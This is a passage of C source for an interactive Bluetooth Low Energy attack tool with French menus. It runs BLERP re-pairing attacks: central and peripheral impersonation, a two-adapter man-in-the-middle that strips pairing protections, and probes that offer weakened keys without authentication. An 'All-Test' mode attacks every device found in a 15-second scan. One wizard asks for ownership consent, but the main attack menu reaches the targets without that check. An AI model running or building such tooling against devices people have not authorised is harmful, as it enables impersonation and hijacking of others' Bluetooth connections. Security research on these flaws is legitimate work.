               UI_GREEN, rep.negotiated_keysize, UI_RESET);
    } else if (!rep.connected) {
        printf("  %s[-] Échec de connexion radio Link Layer vers %s.%s\n", UI_ORANGE, as ? as : "", UI_RESET);
    }
}

// The four tests on one target, merged into `tv`. Test 4 maps the standard
// re-pairing probe onto V2/V4/V6, using the stored bond as the paper requires.
static void eval_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                             const char *as, const char *name, int8_t rssi,
                             const struct smp_bond_info *pbond,
                             struct blerp_target_verdict *tv) {
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s[*] Suite BLERP complète (4 vecteurs) sur %s (%s)%s\n", UI_YELLOW, as ? as : "", name ? name : "Inconnu", UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    printf("\n  %s--- [Test 1/4] Central Impersonation (CI) ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_CI, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 2/4] Peripheral Impersonation (PI) ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_PI, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 3/4] Diagnostic Complet V1-V6 ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_AUDIT, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 4/4] Sonde de Re-Pairing (Standard) ---%s\n", UI_PINK, UI_RESET);
    struct smp_pairing_params offer;
    smp_native_default_offer(&offer);
    offer.auth_req = 0x01;
    offer.max_key_size = 7;
    struct smp_probe_result res;
    memset(&res, 0, sizeof res);
    (void)smp_native_probe_offer(dev_id, addr, atype, 4000, &offer, &res);

    struct smp_repair_verdict rv;
    smp_repair_classify(pbond, &offer, &res, &rv);
    bool bond_auth = pbond && pbond->authenticated;
    enum blerp_verdict pv[BLERP_VULN_COUNT];
    for (int i = 0; i < BLERP_VULN_COUNT; i++) pv[i] = BLERP_VERDICT_INCONCLUSIVE;
    pv[BLERP_V2_UNAUTH_REPAIR]     = smp_repair_verdict_v2(&rv);
    pv[BLERP_V4_LEVEL_DOWNGRADE]   = smp_repair_verdict_v4(bond_auth, &rv);
    pv[BLERP_V6_ENTROPY_DOWNGRADE] = smp_repair_verdict_v6(&rv);
    blerp_target_verdict_merge(tv, pv, rv.outcome == SMP_REPAIR_REFUSED ? rv.fail_reason : 0);

    switch (rv.outcome) {
    case SMP_REPAIR_REFUSED:
        printf("  %s[-] Sonde : refus SMP 0x%02x. %s%s\n", UI_GREEN, rv.fail_reason,
               refusal_meaning(rv.fail_reason), UI_RESET);
        break;
    case SMP_REPAIR_ACCEPTED_DOWNGRADE:
        printf("  %s[!] Sonde : re-pairing accepté sous le niveau de l'ARPK.%s\n", UI_RED, UI_RESET);
        break;
    case SMP_REPAIR_ACCEPTED_SAFE:
        printf("  %s[!] Sonde : re-pairing accepté sans authentification (V2), sans descendre sous l'ARPK.%s\n",
               UI_RED, UI_RESET);
        break;
    case SMP_REPAIR_NO_REPLY:
        printf("  %s[-] Sonde : pas de réponse SMP, non concluant.%s\n", UI_ORANGE, UI_RESET);
        break;
    }
}

// Single BLERP test with its rating printed. True only when vulnerable.
static bool run_blerp_target_test(int dev_id, enum blerp_attack_type type,
                                  const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond) {
    struct blerp_target_verdict tv;
    blerp_target_verdict_init(&tv);
    eval_target_test(dev_id, type, addr, atype, as, name, rssi, pbond, &tv);
    enum blerp_rating r = blerp_target_rating(&tv);
    print_target_rating(&tv, r);
    return r == BLERP_RATING_VULNERABLE;
}

// Four-test suite with its rating printed. True only when vulnerable.
static bool run_blerp_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond) {
    struct blerp_target_verdict tv;
    blerp_target_verdict_init(&tv);
    eval_all_4_tests(dev_id, addr, atype, as, name, rssi, pbond, &tv);
    enum blerp_rating r = blerp_target_rating(&tv);
    print_target_rating(&tv, r);
    return r == BLERP_RATING_VULNERABLE;
}

// [-B-] BLERP Attack wizard: standalone interactive menu for executing CI, PI, MitM, or full audit,
// fully integrated with Option Finale (Scan 15s, BlueZ bonds, manual input, single target or All-Test).
static void menu_blerp_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== BLERP Attack Suite (sacca97/blerp NDSS 2026) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sModes d'attaque BLERP :%s\n", UI_PINK, UI_RESET);
    printf("  %s[-1-]%s Central Impersonation (CI)     - Cible accessoire / périphérique\n", UI_YELLOW, UI_RESET);
    printf("  %s[-2-]%s Peripheral Impersonation (PI)  - Cible smartphone / centrale (Rejet V5)\n", UI_YELLOW, UI_RESET);
    printf("  %s[-3-]%s Double-Channel MitM (2 dev)   - Interception & stripping MITM/SC\n", UI_YELLOW, UI_RESET);
    printf("  %s[-4-]%s Audit complet V1-V6           - Cascade diagnostique officielle\n", UI_YELLOW, UI_RESET);
    printf("  %s[-5-]%s Suite Complète (4 Tests)      - CI + PI + Audit V1-V6 + Re-Pairing\n", UI_YELLOW, UI_RESET);
    printf("  %s[-6-]%s Option Finale (Automatisée)   - Pipeline complet : Consentement -> Scan 15s -> Test / All-Test\n", UI_GREEN, UI_RESET);
    printf("  %sSélectionnez [1-6] : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char mline[16];
    if (read_line(mline, sizeof mline) < 0 || mline[0] == '\0') return;

    if (mline[0] == '6' || mline[0] == 'f' || mline[0] == 'F') {
        menu_finale_wizard(-1);
        return;
    }

    if (mline[0] == '3') {
        long dev_id2 = ask_number("Interface secondaire", "index HCI pour l'autre rôle (ex: 1)", 1);
        struct blerp_attack_config cfg;
        blerp_config_init(&cfg, BLERP_ATTACK_MITM);
        cfg.dev_id = (int)dev_id;
        cfg.dev_id_sec = (int)dev_id2;
        struct blerp_attack_report rep;
        blerp_run_mitm(&cfg, &rep);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    bool is_suite_4 = (mline[0] == '5');
    enum blerp_attack_type type = (mline[0] == '2') ? BLERP_ATTACK_PI :
                                  (mline[0] == '4') ? BLERP_ATTACK_AUDIT :
                                  BLERP_ATTACK_CI;

    const char *mode_label = is_suite_4 ? "Suite Complète 4 Tests" :
                             (type == BLERP_ATTACK_PI ? "Peripheral Impersonation (PI)" :
                             (type == BLERP_ATTACK_AUDIT ? "Audit V1-V6" : "Central Impersonation (CI)"));

    printf("\n  %sSélection de la cible pour [%s] :%s\n", UI_PINK, mode_label, UI_RESET);
    printf("  %s[1]%s Scanner l'environnement (Scan BLE 15s - flux Option Finale) [Défaut]\n", UI_YELLOW, UI_RESET);
    printf("  %s[2]%s Sélectionner parmi les bonds BlueZ existants\n", UI_YELLOW, UI_RESET);
    printf("  %s[3]%s Saisie manuelle de l'adresse MAC\n", UI_YELLOW, UI_RESET);
    printf("  %s[4]%s Mode All-Test (scan 15s puis attaque sur TOUTES les cibles)\n", UI_YELLOW, UI_RESET);
    printf("  %sChoix [1-4, défaut 1] : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char tsel[16];
    if (read_line(tsel, sizeof tsel) < 0) return;

    char adapter[18];
    bool has_adapter = (smp_adapter_addr((int)dev_id, adapter) == 0);
    char bonded_list[32][18];
    int n_bonds = 0;
    if (has_adapter) {
        n_bonds = smp_bond_list(BLEURP_BLUEZ_STORE_DIR, adapter, bonded_list, 32);
        if (n_bonds < 0) n_bonds = 0;
    }

    if (tsel[0] == '2') {
        if (n_bonds == 0) {
            printf("\n  %s[-] Aucun bond BlueZ trouvé pour cet adaptateur (%s). Bascule en saisie manuelle.%s\n",
                   UI_ORANGE, adapter, UI_RESET);
            tsel[0] = '3';
        } else {
            printf("\n  %sBonds BlueZ enregistrés :%s\n", UI_PINK, UI_RESET);
            for (int b = 0; b < n_bonds; b++) {
                printf("    %s[%d]%s %s\n", UI_YELLOW, b + 1, UI_RESET, bonded_list[b]);
            }
            printf("  %sNuméro du bond [1-%d, défaut 1] : %s", UI_PINK, n_bonds, UI_RESET);
            fflush(stdout);
            char bnum[16];
            int bidx = 1;
            if (read_line(bnum, sizeof bnum) == 0 && bnum[0] != '\0') {
                bidx = atoi(bnum);
            }
            size_t uidx = (bidx >= 1 && bidx <= n_bonds) ? (size_t)(bidx - 1) : 0;
            if (uidx >= 32) uidx = 0;
            char target_str[18];
            strncpy(target_str, bonded_list[uidx], sizeof(target_str) - 1);
            target_str[sizeof(target_str) - 1] = '\0';
            uint8_t addr[6];
            parse_addr(target_str, addr);
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;
            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests((int)dev_id, addr, BLEURP_BDADDR_LE_PUBLIC, target_str, "Bond BlueZ", -50, pbond);
            } else {
                auth = run_blerp_target_test((int)dev_id, type, addr, BLEURP_BDADDR_LE_PUBLIC, target_str, "Bond BlueZ", -50, pbond);
            }
            if (auth) banner_print_success(stdout);
            printf("\n(entree pour continuer) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
            return;
        }
    }

    if (tsel[0] == '3') {
        printf("  %sAdresse cible%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
        fflush(stdout);
        char addr_str[64];
        if (read_line(addr_str, sizeof addr_str) < 0 || addr_str[0] == '\0') return;

        uint8_t addr[6];
        if (parse_addr(addr_str, addr) < 0) {
            printf("  [-] Adresse invalide.\n");
            return;
        }

        printf("  %sType d'adresse%s (public/random) [public]: ", UI_PINK, UI_RESET);
        fflush(stdout);
        char t[16];
        uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
        if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) atype = BLEURP_BDADDR_LE_RANDOM;

        struct smp_bond_info bond;
        struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, addr_str, &bond) == 0) ? &bond : NULL;

        bool auth = false;
        if (is_suite_4) {
            auth = run_blerp_all_4_tests((int)dev_id, addr, atype, addr_str, "Cible manuelle", -50, pbond);
        } else {
            auth = run_blerp_target_test((int)dev_id, type, addr, atype, addr_str, "Cible manuelle", -50, pbond);
        }
        if (auth) banner_print_success(stdout);

        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    // Flux de Scan 15s (Option Finale intégrée dans Option B)
    int is_all = (tsel[0] == '4') ? 1 : 0;
    printf("\n  %s[*] Lancement du scan BLE (15 secondes)...%s\n\n", UI_GREEN, UI_RESET);
    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    int rc = run_scan((int)dev_id, 15, 1, &table);
    if (rc < 0) {
        printf("\n  %s[-] Scan indisponible.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);

    if (count == 0 && n_bonds == 0) {
        printf("\n  %s[-] Aucun appareil détecté après 15s de scan et aucun bond connu.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sAppareils détectés pendant le scan (15s) : %zu trouvé(s)%s\n", UI_YELLOW, count, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    size_t shown = count < 10 ? count : 10;
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    if (!is_all && count > 1) {
        printf("\n  %sNuméro de l'appareil à tester (1-%zu, [1] par défaut, 'A' pour All-Test) : %s", UI_PINK, shown, UI_RESET);
        fflush(stdout);
        char pnum[16];
        if (read_line(pnum, sizeof pnum) == 0 && pnum[0] != '\0') {
            if (pnum[0] == 'a' || pnum[0] == 'A') {
                is_all = 1;
            }
        }
    }

    if (is_all) {
        printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
               UI_YELLOW, mode_label, count, UI_RESET);
        signal(SIGINT, on_sigint);
        g_stop = 0;
        int total_tested = 0;
        int total_authorized = 0;
        for (size_t i = 0; i < count && !g_stop; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";
            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                   i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;
            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests((int)dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
            } else {
                auth = run_blerp_target_test((int)dev_id, type, e->address, e->addr_type, as, name, e->rssi, pbond);
            }
            if (auth) total_authorized++;
            total_tested++;
        }
        signal(SIGINT, SIG_DFL);
        printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
               total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
        printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        if (total_authorized > 0) banner_print_success(stdout);
    } else {
        const struct dev_entry *target = NULL;
        for (size_t i = 0; i < count; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            for (int b = 0; b < n_bonds; b++) {
                if (strcasecmp(as, bonded_list[b]) == 0) {
                    target = e;
                    break;
                }
            }
            if (target) break;
        }
        if (!target && count > 0) {
            target = dev_table_at(&table, 0);
        }

        uint8_t target_addr[6];
        uint8_t target_atype = BLEURP_BDADDR_LE_PUBLIC;
        char target_str[18] = "";
        char target_name[256] = "Inconnu";
        int8_t target_rssi = -100;

        if (target) {
            memcpy(target_addr, target->address, 6);
            target_atype = target->addr_type;
            target_rssi = target->rssi;
            snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                     target_addr[5], target_addr[4], target_addr[3],
                     target_addr[2], target_addr[1], target_addr[0]);
            if (target->has_name && target->name[0]) {
                snprintf(target_name, sizeof target_name, "%s", target->name);
            }
        } else if (n_bonds > 0) {
            parse_addr(bonded_list[0], target_addr);
            snprintf(target_str, sizeof target_str, "%s", bonded_list[0]);
            target_atype = BLEURP_BDADDR_LE_PUBLIC;
            snprintf(target_name, sizeof target_name, "Bond BlueZ");
        }

        struct smp_bond_info bond;
        struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;

        bool authorized = false;
        if (is_suite_4) {
            authorized = run_blerp_all_4_tests((int)dev_id, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
        } else {
            authorized = run_blerp_target_test((int)dev_id, type, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
        }

        if (authorized) {
            banner_print_success(stdout);
        } else {
            printf("\n  %s[-] Le re-pairing n'a pas été autorisé ou la connexion a échoué.%s\n", UI_RED, UI_RESET);
        }
    }

    dev_table_free(&table);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-F-] Option Finale : One-touch scan (15s), consent validation messages,
// connection and re-pairing test (single target or All-Test), with green ASCII SUCCESS banner on authorization.
static void menu_finale_wizard(int force_all_test) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[-F-] Option Finale : Scan 15s -> Test Connexion & Re-pairing%s\n", UI_YELLOW, UI_BOLD, UI_RESET);
    printf("  %s============================================================%s\n\n", UI_PURPLE, UI_RESET);

    printf("  %s[!] AVERTISSEMENT LÉGAL ET VÉRIFICATION DU CONSENTEMENT%s\n", UI_ORANGE, UI_RESET);
    printf("  %sCette opération automatisée va exécuter les étapes suivantes :%s\n", UI_PINK, UI_RESET);
    printf("    1. Scan radio BLE actif pendant 15 secondes pour détecter les cibles.\n");
    printf("    2. Tentative de connexion Link Layer vers l'appareil cible retenu (ou l'ensemble en All-Test).\n");
    printf("    3. Test d'attaque et de re-pairing SMP (référence sacca97/blerp, NDSS 2026).\n");
    printf("  %sCes actions sont strictement réservées aux équipements dont vous êtes%s\n", UI_PURPLE, UI_RESET);
    printf("  %spropriétaire ou pour lesquels vous détenez un mandat écrit d'audit.%s\n\n", UI_PURPLE, UI_RESET);

    // Validation 1 : Vérification formelle de l'autorisation
    printf("  %s[Validation 1/2] Autorisation légale d'audit :%s\n", UI_PINK, UI_RESET);
    if (!ask_yes_no("Autorisation", "confirmez-vous être propriétaire ou détenir un mandat d'audit", 0)) {
        printf("\n  %s[-] Opération annulée : autorisation requise pour continuer.%s\n", UI_RED, UI_RESET);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    // Sélection du mode d'attaque BLERP (sacca97/blerp)
    int all_test = 0;
    bool is_mitm = false;
    bool is_suite_4 = false;
    enum blerp_attack_type attack_type = BLERP_ATTACK_CI;
    if (force_all_test >= 0) {
        all_test = force_all_test;
    } else {
        printf("\n  %sModes d'attaque BLERP (sacca97/blerp NDSS 2026) :%s\n", UI_PINK, UI_RESET);
        printf("  %s[1]%s Central Impersonation (CI)     - Cible accessoire / périphérique [Défaut]\n", UI_YELLOW, UI_RESET);
        printf("  %s[2]%s Peripheral Impersonation (PI)  - Cible smartphone / centrale (Rejet V5)\n", UI_YELLOW, UI_RESET);
        printf("  %s[3]%s Double-Channel MitM (2 dev)   - Interception & stripping MITM/SC\n", UI_YELLOW, UI_RESET);
        printf("  %s[4]%s Audit complet V1-V6           - Cascade diagnostique multi-failles\n", UI_YELLOW, UI_RESET);
        printf("  %s[5]%s Suite Complète (4 Tests)      - CI + PI + Audit V1-V6 + Re-Pairing\n", UI_YELLOW, UI_RESET);
        printf("  %s[6]%s Option All-Test               - Tester le re-pairing sur TOUS les appareils\n", UI_YELLOW, UI_RESET);
        printf("  %sSélectionnez le mode [1-6, défaut: 1] : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char mline[16];
        if (read_line(mline, sizeof mline) == 0 && mline[0] != '\0') {
            if (mline[0] == '2') attack_type = BLERP_ATTACK_PI;
            else if (mline[0] == '3') is_mitm = true;
            else if (mline[0] == '4') attack_type = BLERP_ATTACK_AUDIT;
            else if (mline[0] == '5') is_suite_4 = true;
            else if (mline[0] == '6') all_test = 1;
            else attack_type = BLERP_ATTACK_CI;
        }
    }

    if (all_test && !is_suite_4) {
        printf("\n  %sMode d'attaque pour la séquence All-Test :%s\n", UI_PINK, UI_RESET);
        printf("  %s[1]%s Central Impersonation (CI) [Défaut]\n", UI_YELLOW, UI_RESET);
        printf("  %s[2]%s Peripheral Impersonation (PI)\n", UI_YELLOW, UI_RESET);
        printf("  %s[3]%s Audit complet V1-V6\n", UI_YELLOW, UI_RESET);
        printf("  %s[4]%s Suite Complète 4 Tests\n", UI_YELLOW, UI_RESET);
        printf("  %sSélectionnez [1-4, défaut 1] : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char atsel[16];
        if (read_line(atsel, sizeof atsel) == 0 && atsel[0] != '\0') {
            if (atsel[0] == '2') attack_type = BLERP_ATTACK_PI;
            else if (atsel[0] == '3') attack_type = BLERP_ATTACK_AUDIT;
            else if (atsel[0] == '4') is_suite_4 = true;
            else attack_type = BLERP_ATTACK_CI;
        }
    }

    const char *sel_name = is_mitm ? "Double-Channel MitM (2 adaptateurs)" :
                           is_suite_4 ? (all_test ? "All-Test (Suite Complète 4 Tests)" : "Suite Complète (4 Tests BLERP)") :
                           all_test ? (attack_type == BLERP_ATTACK_PI ? "All-Test (PI sur toutes les cibles)" :
                                       attack_type == BLERP_ATTACK_AUDIT ? "All-Test (Audit V1-V6 sur toutes les cibles)" :
                                       "All-Test (CI sur toutes les cibles)") :
                           (attack_type == BLERP_ATTACK_PI) ? "Peripheral Impersonation (PI)" :
                           (attack_type == BLERP_ATTACK_AUDIT) ? "Audit Complet V1-V6" :
                           "Central Impersonation (CI)";

    // Validation 2 : Consentement explicite de l'opérateur
    printf("\n  %s[Validation 2/2] Consentement explicite de l'opérateur :%s\n", UI_PINK, UI_RESET);
    printf("  %sMode sélectionné : %s%s%s\n", UI_PURPLE, UI_BOLD, sel_name, UI_RESET);
    printf("  %sConsentez-vous expressément à l'exécution de l'opération ?%s\n", UI_PURPLE, UI_RESET);
    printf("  %sTapez 'OUI' pour valider et continuer (toute autre saisie annule) : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char consent[32];
    if (read_line(consent, sizeof consent) < 0 ||
        (strcmp(consent, "oui") != 0 && strcmp(consent, "OUI") != 0 &&
         strcmp(consent, "yes") != 0 && strcmp(consent, "YES") != 0)) {
        printf("\n  %s[-] Opération annulée : consentement non accordé.%s\n", UI_RED, UI_RESET);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    if (is_mitm) {
        int dev_id = bleurp_hci_find_default_dev();
        long dev_id2 = ask_number("Interface secondaire", "index HCI pour l'autre rôle (ex: 1)", 1);
        struct blerp_attack_config cfg;
        blerp_config_init(&cfg, BLERP_ATTACK_MITM);
        cfg.dev_id = dev_id;
        cfg.dev_id_sec = (int)dev_id2;
        struct blerp_attack_report rep;
        blerp_run_mitm(&cfg, &rep);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s[+] Consentement validé (%s). Lancement automatique du scan BLE (15 secondes)...%s\n\n",
           UI_GREEN, sel_name, UI_RESET);

    int dev_id = bleurp_hci_find_default_dev();
    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    int rc = run_scan(dev_id, 15, 1, &table);
    if (rc < 0) {
        printf("\n  %s[-] Scan indisponible (vérifiez les permissions ou l'adaptateur).%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    char adapter[18];
    bool has_adapter = (smp_adapter_addr(dev_id, adapter) == 0);
    char bonded_list[32][18];
    int n_bonds = 0;
    if (has_adapter) {
        n_bonds = smp_bond_list(BLEURP_BLUEZ_STORE_DIR, adapter, bonded_list, 32);
        if (n_bonds < 0) n_bonds = 0;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);

    if (count == 0 && n_bonds == 0) {
        printf("\n  %s[-] Aucun appareil détecté après 15s de scan et aucun bond connu.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sAppareils détectés pendant le scan (15s) : %zu trouvé(s)%s\n", UI_YELLOW, count, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    size_t shown = count < 10 ? count : 10;
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    if (all_test) {
        printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
               UI_YELLOW, sel_name, count, UI_RESET);

        signal(SIGINT, on_sigint);
        g_stop = 0;

        int total_tested = 0;
        int total_authorized = 0;

        for (size_t i = 0; i < count && !g_stop; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";

            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                   i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);

            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;

            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests(dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
            } else {
                auth = run_blerp_target_test(dev_id, attack_type, e->address, e->addr_type, as, name, e->rssi, pbond);
            }
            if (auth) {
                total_authorized++;
            }
            total_tested++;
        }

        signal(SIGINT, SIG_DFL);

        printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
               total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
        printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

        if (total_authorized > 0) {
            banner_print_success(stdout);
        } else {
            printf("\n  %s[-] Aucun appareil n'a autorisé le re-pairing lors du All-Test BLERP.%s\n", UI_RED, UI_RESET);
        }
    } else {
        // Mode cible unique : priorité ou sélection manuelle par l'opérateur
        const struct dev_entry *target = NULL;
        if (count > 1) {
            printf("\n  %sNuméro de l'appareil à tester (1-%zu, [1] par défaut, 'A' pour All-Test) : %s", UI_PINK, shown, UI_RESET);
            fflush(stdout);
            char pnum[16];
            if (read_line(pnum, sizeof pnum) == 0 && pnum[0] != '\0') {
                if (pnum[0] == 'a' || pnum[0] == 'A') {
                    all_test = 1;
                } else {
                    int idx = atoi(pnum);
                    if (idx >= 1 && (size_t)idx <= count) {
                        target = dev_table_at(&table, (size_t)idx - 1);
                    }
                }
            }
        }

        if (all_test) {
            printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
                   UI_YELLOW, sel_name, count, UI_RESET);

            signal(SIGINT, on_sigint);
            g_stop = 0;

            int total_tested = 0;
            int total_authorized = 0;

            for (size_t i = 0; i < count && !g_stop; i++) {
                const struct dev_entry *e = dev_table_at(&table, i);
                char as[18];
                snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                         e->address[5], e->address[4], e->address[3],
                         e->address[2], e->address[1], e->address[0]);
                const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";

                printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
                printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                       i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);

                struct smp_bond_info bond;
                struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;

                bool auth = false;
                if (is_suite_4) {
                    auth = run_blerp_all_4_tests(dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
                } else {
                    auth = run_blerp_target_test(dev_id, attack_type, e->address, e->addr_type, as, name, e->rssi, pbond);
                }
                if (auth) {
                    total_authorized++;
                }
                total_tested++;
            }

            signal(SIGINT, SIG_DFL);

            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
                   total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
            printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

            if (total_authorized > 0) {
                banner_print_success(stdout);
            } else {
                printf("\n  %s[-] Aucun appareil n'a autorisé le re-pairing lors du All-Test BLERP.%s\n", UI_RED, UI_RESET);
            }
        } else {
            if (!target) {
                for (size_t i = 0; i < count; i++) {
                    const struct dev_entry *e = dev_table_at(&table, i);
                    char as[18];
                    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                             e->address[5], e->address[4], e->address[3],
                             e->address[2], e->address[1], e->address[0]);
                    for (int b = 0; b < n_bonds; b++) {
                        if (strcasecmp(as, bonded_list[b]) == 0) {
                            target = e;
                            break;
                        }
                    }
                    if (target) break;
                }
                if (!target && count > 0) {
                    target = dev_table_at(&table, 0);
                }
            }

            uint8_t target_addr[6];
